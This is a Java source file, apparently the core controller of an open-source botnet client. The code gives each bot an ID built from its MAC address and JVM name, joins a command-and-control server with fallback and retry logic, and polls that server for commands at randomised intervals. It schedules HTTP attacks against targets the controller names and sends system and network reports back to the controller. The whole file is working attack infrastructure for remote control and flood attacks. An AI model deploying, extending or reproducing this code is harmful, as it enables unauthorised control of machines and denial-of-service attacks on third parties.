/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core;

import com.acmutv.botnet.config.AppConfiguration;
import com.acmutv.botnet.config.AppConfigurationService;
import com.acmutv.botnet.config.serial.AppConfigurationFormat;
import com.acmutv.botnet.core.analysis.Analyzer;
import com.acmutv.botnet.core.analysis.NetworkAnalyzer;
import com.acmutv.botnet.core.analysis.SystemAnalyzer;
import com.acmutv.botnet.core.attack.HttpAttack;
import com.acmutv.botnet.core.control.Controller;
import com.acmutv.botnet.core.control.command.BotCommand;
import com.acmutv.botnet.core.control.command.BotCommandService;
import com.acmutv.botnet.core.control.command.CommandScope;
import com.acmutv.botnet.core.exception.*;
import com.acmutv.botnet.core.exec.BotPool;
import com.acmutv.botnet.core.exec.ResourceReleaser;
import com.acmutv.botnet.core.report.*;
import com.acmutv.botnet.core.exec.BotState;
import com.acmutv.botnet.log.AppLogMarkers;
import com.acmutv.botnet.tool.io.IOManager;
import com.acmutv.botnet.tool.net.HttpManager;
import com.acmutv.botnet.tool.net.HttpMethod;
import com.acmutv.botnet.tool.runtime.RuntimeManager;
import com.acmutv.botnet.tool.net.ConnectionManager;
import com.acmutv.botnet.tool.time.Duration;
import com.acmutv.botnet.tool.time.Interval;
import com.fasterxml.jackson.core.JsonProcessingException;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.quartz.CronExpression;
import org.quartz.SchedulerException;

import java.io.IOException;
import java.io.InputStream;
import java.net.SocketException;
import java.net.URL;
import java.net.UnknownHostException;
import java.text.ParseException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;

/**
 * The core business logic.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 */
public class CoreController {

  private static final Logger LOGGER = LogManager.getLogger(CoreController.class);

  /**
   * The bot ID.
   */
  private static String ID;

  /**
   * The bot state.
   */
  private static BotState STATE;

  /**
   * The bot thread pool.
   */
  private static BotPool POOL;

  /**
   * The configured analyzers.
   */
  private static List<Analyzer> ANALYZERS = new ArrayList<>();

  /**
   * The current controller.
   */
  private static Controller CONTROLLER;

  /**
   * The list of shutdown hooks.
   */
  private static List<Runnable> SHUTDOWN_HOOKS = new ArrayList<Runnable>(){{
    add(new ResourceReleaser(POOL));
  }};

  /**
   * The bot entry-point.
   * @throws BotFatalException when bot's life cycle is interrupted.
   */
  public static void startBot() throws BotFatalException {
    changeState(BotState.INIT);
    boolean alive = true;
    while (alive) {
      switch (STATE) {
        case INIT:
          LOGGER.trace("[INIT Branch]");
          try {
            initializeBot();
          } catch (BotInitializationException exc) {
            throw new BotFatalException("Cannot initialize bot. %s", exc.getMessage());
          }
          break;

        case JOIN:
          LOGGER.trace("[JOIN Branch]");
          try {
            joinBotnet();
          } catch (BotInitializationException exc) {
            throw new BotFatalException("Cannot join botnet. %s", exc.getMessage());
          }
          break;

        case EXECUTION:
          LOGGER.trace("[EXECUTION Branch]");
          BotCommand cmd = BotCommand.NONE;
          try {
            cmd = getNextCommand();
            executeCommand(cmd);
            if (cmd.getScope().isWithReport() ||
                (Boolean) cmd.getParams().getOrDefault("report", false)) {
              report();
            }
          } catch (BotCommandParsingException exc) {
            LOGGER.warn("Cannot read command. {}", exc.getMessage());
          } catch (BotMalformedCommandException exc) {
            LOGGER.warn("Not valid command read. {}", exc.getMessage());
          } catch (BotExecutionException exc) {
            LOGGER.warn("Cannot execute command. {}", exc.getMessage());
          } finally {
            if (!cmd.getScope().equals(CommandScope.KILL) &&
                !cmd.getScope().equals(CommandScope.RESTART)) {
              try {
                waitPolling(CONTROLLER.getPolling(AppConfigurationService.getConfigurations().getPolling()).getRandomDuration());
              } catch (InterruptedException ignored) {}
            }
          }

          break;

        case ASLEEP:
          LOGGER.trace("[ASLEEP Branch]");
          BotCommand cmdWhileSleeping = BotCommand.NONE;
          try {
            cmdWhileSleeping = getNextCommand();
            executeCommand(cmdWhileSleeping);
          } catch (BotCommandParsingException exc) {
            LOGGER.warn("Cannot read command. {}", exc.getMessage());
          } catch (BotMalformedCommandException exc) {
            LOGGER.warn("Not valid command read. {}", exc.getMessage());
          } catch (BotExecutionException exc) {
            LOGGER.warn("Cannot execute command. {}", exc.getMessage());
          } finally {
            if (!cmdWhileSleeping.getScope().equals(CommandScope.WAKEUP) &&
                !cmdWhileSleeping.getScope().equals(CommandScope.KILL) &&
                !cmdWhileSleeping.getScope().equals(CommandScope.RESTART)) {
              try {
                waitPolling(CONTROLLER.getPolling(AppConfigurationService.getConfigurations().getPolling()).getRandomDuration());
              } catch (InterruptedException ignored) {}
            }
          }

          break;

        case DEAD:
          LOGGER.trace("[DEAD Branch]");
          alive = false;
          break;

        default:
          LOGGER.trace("[DEFAULT Branch]");
          break;
      }
    }
  }

  /**
   * Executes the state {@code INIT}.
   * Initializes the bot, giving it an identity.
   * @throws  BotInitializationException when errors during initialization.
   */
  private static void initializeBot() throws BotInitializationException {
    LOGGER.traceEntry("Initializing bot...");
    try {
      generateId();
    } catch (SocketException | UnknownHostException exc) {
      throw new BotInitializationException("Cannot generated bot ID. %s", exc.getMessage());
    }
    for (Runnable hook : SHUTDOWN_HOOKS) {
      Thread thread = new Thread(hook);
      Runtime.getRuntime().addShutdownHook(thread);
    }
    LOGGER.info("Bot initialized with ID={}", ID);
    changeState(BotState.JOIN);
  }

  /**
   * Executes the state {@code JOIN}.
   * Establishes a connection with the controller and make the bot join the botnet.
   * @throws  BotInitializationException when errors during botnet joining.
   */
  private static void joinBotnet() throws BotInitializationException {
    if (AppConfigurationService.getConfigurations().getControllers().isEmpty()) {
      LOGGER.warn("No controller specified. Loading fallback controller...");
      AppConfigurationService.getConfigurations().getControllers().add(AppConfiguration.FALLBACK_CONTROLLER);
    }
    LOGGER.info("Joining botnet...");
    boolean success = false;
    int controllerId = 0;
    Controller controller = null;
    long failures = 0;
    while (!success) {
      controller = AppConfigurationService.getConfigurations().getControllers().get(controllerId);
      final String initResource = controller.getInitResource();
      LOGGER.info("Loading bot configuration from C&C at {}...", initResource);
      try {
        if (HttpManager.isHttpUrl(initResource)) {
          HttpMethod method = HttpMethod.GET;
          URL url = new URL(initResource);
          Map<String,String> props = new HashMap<String,String>(){{put("User-Agent", AppConfigurationService.getConfigurations().getUserAgent());}};
          try (InputStream in =
                   HttpManager.getResponseBodyAsInputStream(method, url, props)) {
            AppConfigurationService.load(AppConfigurationFormat.JSON, in);
          }
        } else {
          AppConfigurationService.load(AppConfigurationFormat.JSON, initResource);
        }
        controllerId = 0;
        controller = AppConfigurationService.getConfigurations().getControllers().get(controllerId);
        success = true;
      } catch (IOException exc) {
        failures++;
        if (failures <= controller.getReconnections(AppConfigurationService.getConfigurations().getReconnections())) {
          try {
            LOGGER.warn("Cannot connect to C&C at {}, waiting for reconnection...", initResource);
            waitPolling(controller.getReconnectionWait(AppConfigurationService.getConfigurations().getReconnectionWait()).getRandomDuration());
          } catch (InterruptedException ignored) { }
        } else {
          LOGGER.warn("Maximum number of reconnections reached for C&C at {}", initResource);
          if (controllerId + 1 < AppConfigurationService.getConfigurations().getControllers().size()) {
            controllerId ++;
            failures = 0;
          } else {
            throw new BotInitializationException("Cannot load bot configuration C&C. %s", exc.getMessage());
          }
        }
      }
    }
    CONTROLLER = controller;
    LOGGER.trace("Botnet joined");
    allocateResources();
    changeState(BotState.EXECUTION);
    LOGGER.info("Bot is up and running");
  }

  /**
   * Executes a command both in state {@code EXECUTION} and {@code ASLEEP}.
   * @param cmd the command to execute.
   * @throws BotMalformedCommandException when command parameters are malformed.
   * @throws BotExecutionException when command cannot be correctly executed.
   */
  private static void executeCommand(final BotCommand cmd)
      throws BotMalformedCommandException, BotExecutionException {
    LOGGER.traceEntry("cmd={}", cmd);
    LOGGER.info("Executing command {} with params {}", cmd.getScope(), cmd.getParams());

    switch (cmd.getScope()) {

      case ATTACK_HTTP:
        if (!STATE.equals(BotState.EXECUTION)) {
          throw new BotExecutionException("Cannot execute command, because [STATE] is not [EXECUTION]");
        }
        @SuppressWarnings("unchecked") final List<HttpAttack> httpAttacks = (List<HttpAttack>) cmd.getParams().get("attacks");
        if (httpAttacks == null) {
          throw new BotMalformedCommandException("Cannot execute command ATTACK_HTTP: param [attacks] is null");
        }

        final Interval attackHttpDelay = (Interval) cmd.getParams().get("delay");
        if (attackHttpDelay != null) {
          delayCommand(attackHttpDelay.getRandomDuration(), CommandScope.KILL);
        }

        for (HttpAttack attack : httpAttacks) {
          attackHttp(attack);
        }

        break;

      case CALMDOWN:
        if (!STATE.equals(BotState.EXECUTION)) {
          throw new BotExecutionException("Cannot execute command, because [STATE] is not [EXECUTION]");
        }
        final Interval calmdownDelay = (Interval) cmd.getParams().get("delay");
        if (calmdownDelay != null) {
          delayCommand(calmdownDelay.getRandomDuration(), CommandScope.CALMDOWN);
        }

        calmdown();

        break;

      case KILL:
        final Boolean killWait = (Boolean) cmd.getParams().getOrDefault("wait", false);

        final Interval killDelay = (Interval) cmd.getParams().get("delay");
        if (killDelay != null) {
          delayCommand(killDelay.getRandomDuration(), CommandScope.KILL);
        }

        kill(killWait);

        break;

      case REPORT:
        if (!STATE.equals(BotState.EXECUTION)) {
          throw new BotExecutionException("Cannot execute command, because [STATE] is not [EXECUTION]");
        }
        final Interval reportDelay = (Interval) cmd.getParams().get("delay");
        if (reportDelay != null) {
          delayCommand(reportDelay.getRandomDuration(), CommandScope.REPORT);
        }

        report();

        break;


      case RESTART:
        final String resource = (String) cmd.getParams().get("resource");
        if (resource == null || resource.isEmpty()) {
          throw new BotMalformedCommandException("Cannot execute command RESTART: param [resource] is null/empty");
        }

        final Boolean restartWait = (Boolean) cmd.getParams().getOrDefault("wait", false);

        final Interval restartDelay = (Interval) cmd.getParams().get("delay");
        if (restartDelay != null) {
          delayCommand(restartDelay.getRandomDuration(), CommandScope.RESTART);
        }

        restartBot(resource, restartWait);

        break;

      case SAVE_CONFIG:
        final Interval saveConfigDelay = (Interval) cmd.getParams().get("delay");
        if (saveConfigDelay != null) {
          delayCommand(saveConfigDelay.getRandomDuration(), CommandScope.SAVE_CONFIG);
        }

        saveConfig();

        break;

      case SLEEP:
        if (!STATE.equals(BotState.EXECUTION)) {
          throw new BotExecutionException("Cannot execute command, because [STATE] is not [EXECUTION]");
        }
        final Interval sleepTimeout = (Interval) cmd.getParams().get("timeout");

        final Interval sleepDelay = (Interval) cmd.getParams().get("delay");
        if (sleepDelay != null) {
          delayCommand(sleepDelay.getRandomDuration(), CommandScope.SLEEP);
        }

        if (sleepTimeout == null) {
          sleep(null);
        } else {
          sleep(sleepTimeout.getRandomDuration());
        }

        break;

      case UPDATE:
        @SuppressWarnings("unchecked") final Map<String,String> settings = (Map<String,String>) cmd.getParams().get("settings");

        final Interval updateDelay = (Interval) cmd.getParams().get("delay");
        if (updateDelay != null) {
          delayCommand(updateDelay.getRandomDuration(), CommandScope.UPDATE);
        }

        update(settings);

        break;

      case WAKEUP:
        if (!STATE.equals(BotState.ASLEEP)) {
          throw new BotExecutionException("Cannot execute command, because [STATE] is not [ASLEEP]");
        }
        final Interval wakeupDelay = (Interval) cmd.getParams().get("delay");
        if (wakeupDelay != null) {
          delayCommand(wakeupDelay.getRandomDuration(), CommandScope.WAKEUP);
        }

        wakeup();

        break;

      default:
        LOGGER.trace("Nothing to execute");
        break;
    }
  }

  /**
   * Executes command {@code ATTACK_HTTP}.
   * @param attack the HTTP attack details.
   * @throws BotExecutionException when te attack cannot be scheduled.
   */
  private static void attackHttp(HttpAttack attack) throws BotExecutionException {
    LOGGER.traceEntry("attack={}", attack);
    LOGGER.info("Scheduling attack against {}...", attack.getTarget());
    attack.getProperties().putIfAbsent("User-Agent", AppConfigurationService.getConfigurations().getUserAgent());
    try {
      POOL.scheduleAttackHttp(attack);
    } catch (SchedulerException exc) {
      throw new BotExecutionException("Cannot schedule attack. %s", exc.getMessage());
    }
    LOGGER.info("Attack scheduled");
  }

  /**
   * Executes command {@code CALMDOWN}.
   * @throws BotExecutionException when the bot cannot calm down.
   */
  private static void calmdown() throws BotExecutionException {
    LOGGER.info("Calming down bot...");
    try {
      POOL.calmdown();
    } catch (SchedulerException exc) {
      throw new BotExecutionException("Cannot calmdown. %s", exc.getMessage());
    }
    LOGGER.info("Bot calmed down");
  }

  /**
   * Executes command {@code KILL}.
   * @param wait if true, waits for job to complete; if false destroy the scheduler immediately.
   * @throws BotExecutionException when bot cannot be killed.
   */
  private static void kill(boolean wait) throws BotExecutionException {
    LOGGER.traceEntry("wait={}", wait);
    freeResources(wait);
    LOGGER.info("Bot shut down");
    changeState(BotState.DEAD);
    LOGGER.traceExit();
  }

  /**
   * Executes command {@code REPORT}.
   * @throws BotExecutionException when bot cannot send report to controllers.
   */
  private static void report() throws BotExecutionException {
    LOGGER.trace("Producing report...");
    Report report = new SimpleReport();
    if (AppConfigurationService.getConfigurations().isCnfInfo()) {
      report.put(SimpleReport.KEY_CONFIGURATION, AppConfigurationService.getConfigurations());
    }
    if (AppConfigurationService.getConfigurations().isTgtInfo()) {
      try {
        report.put(SimpleReport.KEY_ATTACKS_HTTP, POOL.getScheduledHttpAttacks());
      } catch (SchedulerException exc) {
        throw new BotExecutionException("Cannot retrieve scheduled http attack. %s", exc.getMessage());
      }
    }
    for (Analyzer analyzer : ANALYZERS) {
      final String analyzerName = analyzer.getName();
      try {
        final Report analysisReport = analyzer.makeReport();
        report.put(analyzerName, analysisReport);
      } catch (BotAnalysisException exc) {
        throw new BotExecutionException("Cannot produce report for analyzer %s", analyzerName);
      }
    }
    LOGGER.trace("Report produced");
    final String logResource = CONTROLLER.getLogResource();
    LOGGER.info("Sending report to C&C at {}...", logResource);
    final String json;
    try {
      json = report.toJson();
      IOManager.writeResource(logResource, json);
    } catch (JsonProcessingException exc) {
      throw new BotExecutionException("Cannot serialize report. %s", exc.getMessage());
    } catch (IOException exc) {
      throw new BotExecutionException("Cannot communicate with C&C at %s", logResource);
    }
    LOGGER.info(AppLogMarkers.REPORT, "Report sent to C&C at {}\n{}",
        CONTROLLER.getLogResource(), json);
  }

  /**
   * Executes command {@code RESTART}.
   * @param resource the path to the CONTROLLERS initialization resource.
   * @param wait if true, waits for jobs to complete; if false, kills immediately
   * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
   */
  private static void restartBot(String resource, boolean wait) throws BotExecutionException {
    LOGGER.info("Restarting bot with C&C at {}...", resource);
    AppConfiguration newConfig;
    try {
      newConfig = AppConfigurationService.from(AppConfigurationFormat.JSON, resource);
    } catch (IOException exc) {
      throw new BotExecutionException("Cannot restart bot with C&C at %s. %s", resource, exc.getMessage());
    }
    freeResources(wait);
    AppConfigurationService.getConfigurations().copy(newConfig);
    LOGGER.trace("Bot restarted with configuration {}", AppConfigurationService.getConfigurations());
    changeState(BotState.JOIN);
    LOGGER.traceExit();
  }

  /**
   * Executes command {@code SAVE_CONFIG}.
   * @throws BotExecutionException when configuration cannot be saved.
   */
  private static void saveConfig() throws BotExecutionException {
    final String configPath = AppConfigurationService.DEFAULT_CONFIG_FILENAME;
    LOGGER.info("Saving current configuration to file {}...", configPath);
    try {
      AppConfigurationService.store(AppConfigurationFormat.YAML, configPath);
    } catch (IOException exc) {
      throw new BotExecutionException("Configuration cannot be saved. %s", exc.getMessage());
    }
    LOGGER.info("Current configuration saved to file {}...", configPath);
  }

  /**
   * Executes command {@code ASLEEP}
   * @param timeout the time period to sleep.
   * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
   */
  private static void sleep(Duration timeout) throws BotExecutionException {
    LOGGER.traceEntry("timeout={}", timeout);
    if (timeout != null && timeout.getAmount() <= 0) {
      throw new BotExecutionException("Cannot sleep a negative amount of time");
    }

    LOGGER.info("Falling asleep{}...",
        (timeout == null) ? "" : String.format(" (timeout: %s)", timeout));
    changeState(BotState.ASLEEP);
    try {
      POOL.pause();
    } catch (SchedulerException exc) {
      throw new BotExecutionException("Cannot pause jobs. %s", exc.getMessage());
    }
    if (timeout != null) {
      try {
        timeout.getUnit().sleep(timeout.getAmount());
      } catch (InterruptedException exc) {
        throw new BotExecutionException("Cannot complete sleeping. %s", exc.getMessage());
      }
      wakeup();
    }
  }

  /**
   * Executes command {@code UPDATE}.
   * @param settings the settings to update.
   * @throws BotExecutionException when invalid update.
   */
  private static void update(Map<String,String> settings) throws BotExecutionException {
    LOGGER.info("Updating settings {}...", settings);

    if (settings.containsKey("sleep")) {
      final String sleepString = settings.get("sleep");
      CronExpression sleep = null;
      try {
        if (sleepString == null) {
          POOL.removeSleepMode();
        } else {
          sleep = new CronExpression(settings.get("sleep"));
          POOL.setSleepMode(sleep);
        }
      } catch (ParseException|SchedulerException exc) {
        throw new BotExecutionException("Cannot update [sleep]. %s", exc.getMessage());
      }
      AppConfigurationService.getConfigurations().setSleep(sleep);
    }

    LOGGER.info("Settings updated");
  }

  /**
   * Executes command {@code WAKEUP}.
   * @throws BotExecutionException when bot cannot be waken up.
   */
  private static void wakeup() throws BotExecutionException {
    LOGGER.trace("Waking up...");
    try {
      POOL.resume();
    } catch (SchedulerException exc) {
      throw new BotExecutionException("Cannot resume jobs. %s", exc.getMessage());
    }
    LOGGER.info("Awake");
    changeState(BotState.EXECUTION);
  }

  /**
   * Generates the bot ID [MAC_ADDRESS]-[JVM-NAME].
   * @throws SocketException when MAC cannot be read.
   * @throws UnknownHostException when MAC cannot be read.
   */
  private static void generateId() throws SocketException, UnknownHostException {
    LOGGER.traceEntry("Generating ID...");
    final String mac = ConnectionManager.getMAC();
    final String jvmName = RuntimeManager.getJvmName();
    ID = String.format("%s-%s", mac, jvmName);
    LOGGER.trace("ID generated: {}", ID);
  }

  /**
   * Parses a {@link BotCommand} from the resource specified in {@link AppConfiguration}.
   * @return the parsed command; command with scope NONE, in case of error.
   * @throws BotCommandParsingException when command resource is unreachable.
   */
  private static BotCommand getNextCommand() throws BotCommandParsingException {
    final String cmdResource = CONTROLLER.getCmdResource();
    LOGGER.trace("Consuming command from C&C at {}...", cmdResource);
    BotCommand cmd;
    try {
      if (HttpManager.isHttpUrl(cmdResource)) {
        HttpMethod method = HttpMethod.GET;
        URL url = new URL(cmdResource);
        Map<String,String> props = new HashMap<String,String>()
        {{put("User-Agent", AppConfigurationService.getConfigurations().getUserAgent());}};
        try (InputStream in =
                 HttpManager.getResponseBodyAsInputStream(method, url, props)) {
          cmd = BotCommandService.fromJson(in);
        }
      } else {
        cmd = BotCommandService.consumeJsonResource(cmdResource);
      }
    } catch (IOException exc) {
      throw new BotCommandParsingException("Cannot consume command. %s", exc.getMessage());
    }
    LOGGER.info(AppLogMarkers.COMMAND, "Received command {} with params {} from C&C at {}",
        cmd.getScope(), cmd.getParams(), CONTROLLER.getCmdResource());
    return cmd;
  }

  /**
   * Waits {@code delay} before the execution of the command with {@code scope}.
   * @param delay the time to wait.
   * @param scope the command to wait for.
   */
  private static void delayCommand(Duration delay, CommandScope scope) {
    final long amount = delay.getAmount();
    final TimeUnit unit = delay.getUnit();
    LOGGER.info("Waiting before command {} with delay {} {}", scope, amount, unit);
    try {
      unit.sleep(amount);
    } catch (InterruptedException ignored) {}
  }

  /**
   * Make the bot sleep for the specified duration.
   * @param timeout the sleeping period.
   * @throws InterruptedException when the sleeping is interrupted.
   */
  private static void waitPolling(Duration timeout) throws InterruptedException {
    final long amount = timeout.getAmount();
    final TimeUnit unit = timeout.getUnit();
    LOGGER.info("Waiting for polling {} {}...", amount, unit);
    unit.sleep(amount);
  }

  /**
   * Changes the bot state.
   * @param state the new state.
   */
  private static void changeState(BotState state) {
    LOGGER.traceEntry("state={}", state.getName());
    STATE = state;
  }

  /**
   * Allocates bot's resources.
   * @throws BotInitializationException when the scheduler cannot be initialized.
   */
  private static void allocateResources() throws BotInitializationException {
    LOGGER.trace("Allocating resources...");

    LOGGER.trace("Initializing scheduler..");
    try {
      POOL = new BotPool();
    } catch (SchedulerException exc) {
      throw new BotInitializationException("Bot scheduler cannot be initialized. %s", exc.getMessage());
    }
    LOGGER.trace("Scheduler initialized");

    LOGGER.trace("Initializing analyzers");
    if (AppConfigurationService.getConfigurations().isSysInfo()) {
      Analyzer systemAnalyzer = new SystemAnalyzer("system-analysis");
      ANALYZERS.add(systemAnalyzer);
    }

    if (AppConfigurationService.getConfigurations().isNetInfo()) {
      Analyzer networkAnalyzer = new NetworkAnalyzer("network-analysis");
      ANALYZERS.add(networkAnalyzer);
    }
    LOGGER.trace("Analyzers initialized");

    LOGGER.trace("Resources allocated");
  }

  /**
   * Frees bot's resources.
   * @param wait if true, waits for job to complete; if false, frees resources immediately.
   * @throws BotExecutionException when resources cannot be freed.
   */
  private static void freeResources(boolean wait) throws BotExecutionException {
    LOGGER.trace("Freeing resources {} waiting for jobs to complete...", wait ? "" : "not");
    try {
      POOL.destroy(wait);
    } catch (SchedulerException exc) {
      throw new BotExecutionException("Cannot free resources. %s", exc.getMessage());
    }
    LOGGER.trace("Resources freed");
  }

}
